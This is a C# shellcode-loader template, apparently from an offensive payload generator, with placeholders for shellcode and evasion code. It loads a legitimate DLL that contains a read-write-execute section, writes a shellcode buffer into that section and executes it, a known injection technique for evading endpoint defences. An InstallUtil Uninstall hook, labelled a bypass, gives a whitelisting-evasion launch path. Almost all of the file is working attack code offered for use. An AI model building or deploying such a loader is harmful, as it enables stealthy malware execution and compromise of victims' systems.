using System;
using System.Configuration.Install;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;

//####INCLUDE####

//####DEFINE####

//####CODE####

namespace MockThat
{
    class MockThat
    {


        [StructLayout(LayoutKind.Sequential)]
        struct SectionDescriptor
        {
            public IntPtr Start;
            public IntPtr End;
        }

        // Import necessary WinAPI functions from the correct DLLs
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LoadLibrary(string lpLibFileName);

        [DllImport("psapi.dll", SetLastError = true)]
        static extern bool GetModuleInformation(IntPtr hProcess, IntPtr hModule, out MODULEINFO lpmodinfo, uint cb);

        [StructLayout(LayoutKind.Sequential)]
        struct MODULEINFO
        {
            public IntPtr lpBaseOfDll;
            public uint SizeOfImage;
            public IntPtr EntryPoint;
        }

        [DllImport("Dbghelp.dll", SetLastError = true)]
        static extern IntPtr ImageNtHeader(IntPtr hModule);

        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_DOS_HEADER
        {
            public ushort e_magic;
            public ushort e_cblp;
            public ushort e_cp;
            public ushort e_crlc;
            public ushort e_cparhdr;
            public ushort e_minalloc;
            public ushort e_maxalloc;
            public ushort e_ss;
            public ushort e_sp;
            public ushort e_csum;
            public ushort e_ip;
            public ushort e_cs;
            public ushort e_lfarlc;
            public ushort e_ovno;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public ushort[] e_res1;
            public ushort e_oemid;
            public ushort e_oeminfo;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public ushort[] e_res2;
            public int e_lfanew;  // File address of the new exe header
        }

        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_FILE_HEADER
        {
            public ushort Machine;
            public ushort NumberOfSections;
            public uint TimeDateStamp;
            public uint PointerToSymbolTable;
            public uint NumberOfSymbols;
            public ushort SizeOfOptionalHeader;
            public ushort Characteristics;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_OPTIONAL_HEADER64
        {
            public ushort Magic;
            public byte MajorLinkerVersion;
            public byte MinorLinkerVersion;
            public uint SizeOfCode;
            public uint SizeOfInitializedData;
            public uint SizeOfUninitializedData;
            public uint AddressOfEntryPoint;
            public uint BaseOfCode;
            public ulong ImageBase;
            public uint SectionAlignment;
            public uint FileAlignment;
            public ushort MajorOperatingSystemVersion;
            public ushort MinorOperatingSystemVersion;
            public ushort MajorImageVersion;
            public ushort MinorImageVersion;
            public ushort MajorSubsystemVersion;
            public ushort MinorSubsystemVersion;
            public uint Win32VersionValue;
            public uint SizeOfImage;
            public uint SizeOfHeaders;
            public uint CheckSum;
            public ushort Subsystem;
            public ushort DllCharacteristics;
            public ulong SizeOfStackReserve;
            public ulong SizeOfStackCommit;
            public ulong SizeOfHeapReserve;
            public ulong SizeOfHeapCommit;
            public uint LoaderFlags;
            public uint NumberOfRvaAndSizes;
        }


        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_NT_HEADERS
        {
            public uint Signature;
            public IMAGE_FILE_HEADER FileHeader;
            public IMAGE_OPTIONAL_HEADER OptionalHeader;
        }


        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_OPTIONAL_HEADER
        {
            // Define fields specific to 32-bit PE files
        }

        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_SECTION_HEADER
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] Name;
            public uint PhysicalAddress;
            public uint VirtualAddress;
            public uint SizeOfRawData;
            public uint PointerToRawData;
            public uint PointerToRelocations;
            public uint PointerToLinenumbers;
            public ushort NumberOfRelocations;
            public ushort NumberOfLinenumbers;
            public uint Characteristics;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct IMAGE_NT_HEADERS64
        {
            public uint Signature;
            public IMAGE_FILE_HEADER FileHeader;
            public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
        }

        const uint IMAGE_SCN_MEM_EXECUTE = 0x20000000;
        const uint IMAGE_SCN_MEM_WRITE = 0x80000000;
        const uint IMAGE_SCN_MEM_READ = 0x40000000;

        static IntPtr FindRWXOffset(IntPtr hModule)
        {
            // Get the NT headers
            IntPtr ntHeaderPtr = ImageNtHeader(hModule);
            if (ntHeaderPtr == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get NT header.");
                return IntPtr.Zero;
            }

            // Read the NT headers structure
            IMAGE_NT_HEADERS64 ntHeader = Marshal.PtrToStructure<IMAGE_NT_HEADERS64>(ntHeaderPtr);

            // Calculate the pointer to the first section header
            int optionalHeaderSize = ntHeader.FileHeader.SizeOfOptionalHeader;
            IntPtr sectionHeaderPtr = ntHeaderPtr + Marshal.OffsetOf(typeof(IMAGE_NT_HEADERS64), "OptionalHeader").ToInt32() + optionalHeaderSize;

            // Iterate through the section headers to find RWX sections
            for (int i = 0; i < ntHeader.FileHeader.NumberOfSections; i++)
            {
                IMAGE_SECTION_HEADER sectionHeader = Marshal.PtrToStructure<IMAGE_SECTION_HEADER>(sectionHeaderPtr);

                // Check if the section has RWX characteristics
                if ((sectionHeader.Characteristics & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ)) ==
                    (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ))
                {
                    // Print information about the found section
                    Console.WriteLine($"[i] DLL base address: 0x{hModule.ToString("X")}");
                    Console.WriteLine($"\t[i] RWX section offset (RVA): 0x{sectionHeader.VirtualAddress:X}");
                    Console.WriteLine($"\t[i] RWX section size: 0x{sectionHeader.SizeOfRawData:X} bytes");

                    // Return the relative virtual address (RVA) as the offset
                    return (IntPtr)sectionHeader.VirtualAddress;
                }

                // Move to the next section header
                sectionHeaderPtr = IntPtr.Add(sectionHeaderPtr, Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)));
            }

            Console.WriteLine("[-] No RWX section found.");
            return IntPtr.Zero;
        }

        static uint FindRWXSize(IntPtr hModule)
        {
            // Get the NT headers
            IntPtr ntHeaderPtr = ImageNtHeader(hModule);
            if (ntHeaderPtr == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get NT header.");
                return 0;
            }

            IMAGE_NT_HEADERS ntHeaders = Marshal.PtrToStructure<IMAGE_NT_HEADERS>(ntHeaderPtr);
            IntPtr sectionHeaderPtr = GetSectionHeaderPtr(ntHeaderPtr, true);

            // Iterate through the section headers to find RWX sections
            for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++)
            {
                IMAGE_SECTION_HEADER sectionHeader = Marshal.PtrToStructure<IMAGE_SECTION_HEADER>(sectionHeaderPtr);

                // Check if the section has RWX characteristics
                if ((sectionHeader.Characteristics & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ)) ==
                    (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ))
                {
                    Console.WriteLine($"\t[i] RWX section size: {sectionHeader.SizeOfRawData} bytes");
                    return sectionHeader.SizeOfRawData;
                }

                // Move to the next section header
                sectionHeaderPtr = IntPtr.Add(sectionHeaderPtr, Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)));
            }

            Console.WriteLine("[-] No RWX section found.");
            return 0;
        }


        // Helper function to get section header pointer
        static IntPtr GetSectionHeaderPtr(IntPtr ntHeaderPtr, bool is64Bit)
        {
            int optionalHeaderOffset = Marshal.OffsetOf(typeof(IMAGE_NT_HEADERS), "OptionalHeader").ToInt32();
            int optionalHeaderSize = Marshal.PtrToStructure<IMAGE_NT_HEADERS64>(ntHeaderPtr).FileHeader.SizeOfOptionalHeader;

            return ntHeaderPtr + optionalHeaderOffset + optionalHeaderSize;
        }

        static void WriteCodeToSection(IntPtr rwxSectionAddr, byte[] kitsos, int sizekitsos)
        {
            Marshal.Copy(kitsos, 0, rwxSectionAddr, sizekitsos);
            Console.WriteLine($"[i] {sizekitsos} bytes of code written to RWX memory region");
        }

        static void ExecuteCodeFromSection(IntPtr rwxSectionAddr)
        {
            Console.WriteLine("[i] Calling the RWX region address to execute the payload");
            var execDelegate = (Action)Marshal.GetDelegateForFunctionPointer(rwxSectionAddr, typeof(Action));
            execDelegate();
        }

        public static void Main()
        {
            //####EVASION####

            byte[] buf = new byte[####SHELLCODE_LEN####] ####SHELLCODE####;
            string vulnDLLPath = @"C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\CommonExtensions\Microsoft\TeamFoundation\Team Explorer\Git\usr\bin\msys-2.0.dll";
            //string vulnDLLPath = @" C:\Windows\System32\Microsoft.Uev.AppAgent.dll";
            //####CALL####

            IntPtr hDll = LoadLibrary(vulnDLLPath);

            if (hDll == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to load the targeted DLL");
                return;
            }

            if (!GetModuleInformation(Process.GetCurrentProcess().Handle, hDll, out MODULEINFO moduleInfo, (uint)Marshal.SizeOf(typeof(MODULEINFO))))
            {
                Console.WriteLine("[-] Failed to get module info");
                return;
            }

            IntPtr rwxSectionOffset = FindRWXOffset(hDll);
            uint rwxSectionSize = FindRWXSize(hDll);

            IntPtr rwxSectionAddr = moduleInfo.lpBaseOfDll + (int)rwxSectionOffset;

            SectionDescriptor descriptor = new SectionDescriptor
            {
                Start = rwxSectionAddr,
                End = rwxSectionAddr + (int)rwxSectionSize
            };

            Console.WriteLine($"[i] RWX section starts at 0x{descriptor.Start} and ends at 0x{descriptor.End}");

            int kitsosSize = buf.Length;

            WriteCodeToSection(rwxSectionAddr, buf, kitsosSize);

            ExecuteCodeFromSection(rwxSectionAddr);
        }

    }
    // InstallUtill uninstall bypass
    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            MockThat.Main();
        }
    }
}